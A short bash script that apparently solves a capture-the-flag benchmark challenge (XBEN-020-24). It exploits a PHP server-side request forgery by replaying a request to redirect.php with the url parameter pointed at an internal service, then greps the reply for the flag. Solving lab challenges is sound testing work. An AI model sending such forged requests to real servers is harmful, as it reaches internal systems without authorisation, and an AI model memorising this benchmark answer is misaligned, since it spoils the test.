#!/usr/bin/env bash
# XBEN-020-24 — PHP SSRF. Proxy-mode twin. redirect.php fetches any url it is
# given, server-side, so pointing it at the internal-only service returns that
# service's page — the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben020p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/redirect.php' \
  --set 'query.url=http://internal-service/' \
  --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
